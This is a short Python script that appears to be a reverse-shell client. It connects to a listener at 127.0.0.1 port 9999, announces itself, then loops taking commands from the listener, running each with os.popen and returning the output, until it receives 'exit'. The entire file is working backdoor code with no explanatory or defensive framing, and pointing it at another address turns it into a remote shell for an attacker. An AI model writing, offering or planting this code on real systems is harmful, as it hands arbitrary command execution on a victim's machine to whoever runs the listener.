import os
import socket
sock = socket.socket()
sock.connect(("127.0.0.1",9999))
sock.send(b"cmd-Python3")
while 1:
    msg = sock.recv(1024).decode()
    if msg == 'exit':
        break
    result = os.popen(msg).read()
    if result.replace("\n","").replace("\t","") == '':
        result = "[*]exec-ok"
    print(msg)
    sock.send(str(len(result)).encode())
    sock.send(result.encode())
